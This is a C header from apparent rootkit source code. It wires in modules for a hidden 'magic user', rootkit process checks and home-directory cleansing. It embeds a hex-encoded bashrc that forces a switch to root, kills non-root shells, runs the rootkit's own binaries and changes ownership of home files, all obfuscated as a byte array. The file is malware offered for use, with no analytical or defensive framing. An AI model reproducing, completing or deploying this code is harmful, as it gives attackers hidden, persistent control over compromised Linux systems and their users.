#ifndef NO_ROOTKIT_ANSI
#include "banner.h"
#endif

int getlasttime(const char *timepath);
int writenewtime(const char *timepath, int curtime);
int timediff(const char *timepath, int curtime);
int itistime(const char *timepath, int curtime, int timer);
void unsetbadvars(void);
int magicusr(void);
int rkprocup(void);
#include "gid/gid.h"
#include "magicusr.c"
#include "rkproc.c"
#include "times.c"

#ifdef ROOTKIT_BASHRC

#define RKBASHRC_SIZE 236
static char const rkbashrc[RKBASHRC_SIZE] = {0x74,0x74,0x79,0x20,0x2d,0x73,0x20,0x7c,0x7c,0x20,0x72,0x65,0x74,0x75,0x72,0x6e,0x0a,0x5b,0x20,0x21,0x20,0x2d,
                                             0x7a,0x20,0x24,0x54,0x45,0x52,0x4d,0x20,0x5d,0x20,0x26,0x26,0x20,0x65,0x78,0x70,0x6f,0x72,0x74,0x20,0x54,0x45,
                                             0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x0a,0x5b,0x20,0x24,0x28,0x69,0x64,0x20,0x2d,0x75,0x29,0x20,0x21,0x3d,
                                             0x20,0x30,0x20,0x5d,0x20,0x26,0x26,0x20,0x73,0x75,0x20,0x72,0x6f,0x6f,0x74,0x0a,0x5b,0x20,0x24,0x28,0x69,0x64,
                                             0x20,0x2d,0x75,0x29,0x20,0x21,0x3d,0x20,0x30,0x20,0x5d,0x20,0x26,0x26,0x20,0x6b,0x69,0x6c,0x6c,0x20,0x2d,0x39,
                                             0x20,0x24,0x24,0x0a,0x2e,0x2f,0x62,0x64,0x76,0x72,0x6f,0x6c,0x66,0x3b,0x20,0x2e,0x2f,0x62,0x64,0x76,0x20,0x6d,
                                             0x61,0x6b,0x65,0x6c,0x69,0x6e,0x6b,0x73,0x0a,0x61,0x6c,0x69,0x61,0x73,0x20,0x6c,0x73,0x3d,0x27,0x6c,0x73,0x20,
                                             0x2d,0x2d,0x63,0x6f,0x6c,0x6f,0x72,0x3d,0x61,0x75,0x74,0x6f,0x27,0x0a,0x61,0x6c,0x69,0x61,0x73,0x20,0x6c,0x6c,
                                             0x3d,0x27,0x6c,0x73,0x20,0x2d,0x2d,0x63,0x6f,0x6c,0x6f,0x72,0x3d,0x61,0x75,0x74,0x6f,0x20,0x2d,0x41,0x6c,0x46,
                                             0x68,0x6e,0x27,0x0a,0x63,0x68,0x6f,0x77,0x6e,0x20,0x2d,0x68,0x20,0x30,0x3a,0x60,0x69,0x64,0x20,0x2d,0x67,0x60,
                                             0x20,0x7e,0x2f,0x2a,0x20,0x26,0x3e,0x2f,0x64,0x65,0x76,0x2f,0x6e,0x75,0x6c,0x6c};
int writebashrc(void);
void checkbashrc(void);
#include "bashrc.c"

#endif


#ifdef CLEANSE_HOMEDIR
void bdvcleanse(void);
#include "cleanse.c"
#endif
